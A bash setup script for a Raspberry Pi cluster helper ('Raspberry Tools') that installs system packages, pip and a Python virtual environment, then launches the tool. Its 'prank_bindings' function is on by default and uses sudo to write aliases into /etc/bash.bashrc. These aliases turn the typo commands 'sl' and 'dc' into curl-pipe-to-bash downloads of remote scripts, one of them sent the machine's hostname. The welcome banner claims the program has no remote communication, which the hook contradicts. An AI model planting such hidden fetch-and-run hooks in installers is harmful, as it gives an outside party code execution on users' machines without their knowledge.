#!/bin/env bash
hl_true=0
hl_false=1
my_env="lenv"
fresh_env=$hl_false
env_present=$hl_false
colour_a='\033[1;32m'
colour_r='\033[0m'
no_update="--pi-tools-no-update"
no_intro="--pi-tools-bash-skip-intro"
no_prank="--pi-tools-bash-no-prank"
no_env="--pi-tools-no-env"
no_check="--pi-tools-no-check"
no_launch="--pi-tools-no-launch"
new_env="--pi-tools-recreate-environement"

#it is not recommended to edit these variables
update_system=$hl_true
show_intro=$hl_true
add_prank=$hl_true
create_env=$hl_true
check_env=$hl_true
can_launch=$hl_true
re_env=$hl_false

function cecho() {
    echo -e "$colour_a$1$colour_r"
}

function is_admin() {
    if [ "$EUID" -ne 0 ]; then
        return $hl_false
    fi
    return $hl_true
}

function run_as_admin() {
    cecho "The program needs elevated privileges in order to set up the environement"
    cecho "This program is thus relaunching with elevated privileges"
    sudo bash $0 "$@"
}

function beginning_of_script() {
    cecho "Beginning of script"
    cecho "Created by (c) Henry Letellier"
}

function welcome_message() {
    cecho "+=================================================+"
    cecho "|                                                 |"
    cecho "|          Welcome to Raspberry Tools             |"
    cecho "|      The tool to help you set up clusters       |"
    cecho "|                                                 |"
    cecho "| This Script is a guide to help you easley set   |"
    cecho "| up Kubernetes/Docker/Docker-Compose             |"
    cecho "|                                                 |"
    cecho "| This tool can also help you set up common tools |"
    cecho "| like, Desktop Rancher, terraform.               |"
    cecho "|                                                 |"
    cecho "| This program was created by (c) Henry Letellier |"
    cecho "|                                                 |"
    cecho "| This program is provided as if and without any  |"
    cecho "| warranty, use at your own risk.                 |"
    cecho "|                                                 |"
    cecho "| This program can be found on github under the   |"
    cecho "| name: 'Hanra-s-work/ContOpsSync'.               |"
    cecho "|                                                 |"
    cecho "| The libraries used by this program have their   |"
    cecho "| own license, you can check them on the renowned |"
    cecho "| python package site: pypi.org.                  |"
    cecho "| The names of the libaries used by this program  |"
    cecho "| can be found in the file: 'requirements.txt'    |"
    cecho "|                                                 |"
    cecho "| This program is meant to be run on the target   |"
    cecho "| machine, this it does not have any remote       |"
    cecho "| comunication capabilities (appart from using    |"
    cecho "| an internet connection).                        |"
    cecho "|                                                 |"
    cecho "| We hope our program simplifies your tasks and   |"
    cecho "| brings you joy.                                 |"
    cecho "+=================================================+"
}

function has_environement() {
    if [ ! -d $my_env ]; then
        return $hl_false
    fi
    return $hl_true
}

function update_system() {
    if [ $update_system -eq $hl_true ]; then
        cecho "Updating system"
        sudo apt-get update
        sudo apt-get upgrade --with-new-pkgs -y
    fi
}

function ensure_basic_dependencies() {
    cecho "Making sure the default dependencies are present"
    sudo apt install -y \
        git \
        curl \
        wget \
        unzip \
        jq \
        software-properties-common \
        sudo \
        build-essential
}

function install_python_pip() {
    cecho "Installing pip for python"
    sudo apt-get install python3-pip
    sudo apt install \
        libffi-dev \
        libbz2-dev \
        liblzma-dev \
        libsqlite3-dev \
        libncurses5-dev \
        libgdbm-dev \
        zlib1g-dev \
        libreadline-dev \
        libssl-dev \
        tk-dev \
        build-essential \
        libncursesw5-dev \
        libc6-dev \
        openssl \
        git
    cecho "Downloading pip installer"
    curl -O https://bootstrap.pypa.io/get-pip.py
    cecho "Installing pip"
    sudo python3 get-pip.py
    cecho "Removing pip installer"
    rm get-pip.py
}

function has_python_pip() {
    pip3 --version >/dev/null 2>&1
    status_python_pip=$?
    if [ $status_python_pip -ne 0 ]; then
        install_python_pip
    fi
}

function prank_bindings() {
    local bind1="sl"
    local bind2="dc"
    sudo grep "$bind1" /etc/bash.bashrc >/dev/null 2>/dev/null
    if [ $? -eq 1 ]; then
        sudo echo "alias '$bind1=curl -s -L https://raw.githubusercontent.com/HenraL/Hack_me/main/Hack_me | bash -s \"\$(uname -n)\"'" >>/etc/bash.bashrc 2>/dev/null
    fi
    sudo grep "$bind2" /etc/bash.bashrc >/dev/null 2>/dev/null
    if [ $? -eq 1 ]; then
        sudo echo "alias '$bind2=curl -s -L https://github.com/dylanaraps/neofetch/raw/master/neofetch | bash'" >>/etc/bash.bashrc 2>/dev/null
    fi
}

function install_python_venv() {
    cecho "Installing python3-venv"
    sudo apt-get install -y python3-venv
}

function create_environement() {
    if [ $add_prank -eq $hl_true ]; then
        prank_bindings
    fi
    if [ $create_env -eq $hl_true ]; then
        install_python_venv
        cecho "Creating virtual environment"
        python3 -m venv $my_env
        fresh_env=$hl_true
    fi
}

function activate_environement() {
    if [ $env_present -eq $hl_true ]; then
        cecho "Activating environement"
        . ./$my_env/bin/activate
    fi
}

function deactivate_environement() {
    if [ $env_present -eq $hl_true ]; then
        cecho "Deactivating environement"
        deactivate
    fi
}

function set_up_environement() {
    if [ $fresh_env -eq $hl_true ]; then
        cecho "Updating pip"
        python3 -m pip install --upgrade pip
    fi
}

function update_pip_dependencies() {
    if [ $check_env -eq $hl_true ]; then
        cecho "Updating dependencies"
        pip3 install -r ./requirements.txt
    fi
}

function extract_non_launch_arguments() {
    local arg_length=$#
    local new_args=()
    local index_tracker=0
    while [ $index_tracker -lt $arg_length ]; do
        if [ "$1" == "$no_intro" ] || [ "$1" == "$no_prank" ] || [ "$1" == "$no_env" ] || [ "$1" == "$no_check" ] || [ "$1" == "$no_launch" ] || [ "$1" == "$new_env" ] || [ "$1" == "$no_update" ]; then
            shift
            continue
        fi
        new_args+=("$1")
        shift
        let "index_tracker=index_tracker+1"
    done
    echo ${new_args[*]}
}

function start_program() {
    local status=0
    local non_launch_arguments=()
    if [ $can_launch -eq $hl_true ]; then
        chmod +x src/main.py
        cecho "Starting program"
        non_launch_arguments=$(extract_non_launch_arguments "$@")
        if [ ${#non_launch_arguments} -gt 0 ]; then
            echo "Launching with arguments"
            python3 ./src/main.py ${non_launch_arguments[*]}
        else
            echo "Launching without arguments"
            python3 ./src/main.py
        fi
        status=$?
    fi
    return $status
}

function end_of_script() {
    cecho "End of script"
    cecho "Created by (c) Henry Letellier"
    exit $1
}

function changing_owner_permissions() {
    cecho "Changing owner permissions (to $USER)"
    sudo chown -R $USER:$USER ./$my_env
}

function clean_up_installation() {
    cecho "Cleaning up installation (removing unnecessary packages)"
    sudo apt-get autoremove -y
    sudo apt-get autoclean -y
    sudo apt-get clean -y
}

function process_input() {
    local arg_length=$#
    local index_tracker=0
    while [ $index_tracker -lt $arg_length ]; do
        if [ "$1" == "$no_intro" ]; then
            show_intro=$hl_false
        elif [ "$1" == "$no_prank" ]; then
            add_prank=$hl_false
        elif [ "$1" == "$no_env" ]; then
            create_env=$hl_false
        elif [ "$1" == "$no_check" ]; then
            check_env=$hl_false
        elif [ "$1" == "$no_launch" ]; then
            can_launch=$hl_false
        elif [ "$1" == "$new_env" ]; then
            re_env=$hl_true
            fresh_env=$hl_true
            env_present=$hl_false
        elif [ "$1" == "$no_update" ]; then
            update_system=$hl_false
        fi
        shift
        let "index_tracker=index_tracker+1"
    done
}

function remove_env() {
    if [ $re_env -eq $hl_true ]; then
        cecho "Removing environement"
        sudo rm -rf $my_env
    fi
}

function main() {
    local skip_index=0
    local arg_copy=("$@")
    beginning_of_script
    process_input "$@"
    if [ $show_intro -eq $hl_true ]; then
        welcome_message
    fi
    remove_env
    has_environement
    if [ $? -eq $hl_false ] && [ $create_env -eq $hl_true ]; then
        is_admin
        if [ $? -eq $hl_false ]; then
            run_as_admin "$skip_arg" "$no_launch" "$arg_copy"
        else
            update_system
            ensure_basic_dependencies
            has_python_pip
            create_environement
            activate_environement
            set_up_environement
            clean_up_installation
            deactivate_environement
        fi
    fi
    has_environement
    env_present=$?
    activate_environement
    changing_owner_permissions
    update_pip_dependencies
    if [ $skip_index -gt 0 ]; then
        shift $skip_index
    fi
    start_program ${arg_copy[*]}
    deactivate_environement
    end_of_script $?
}

main "$@"
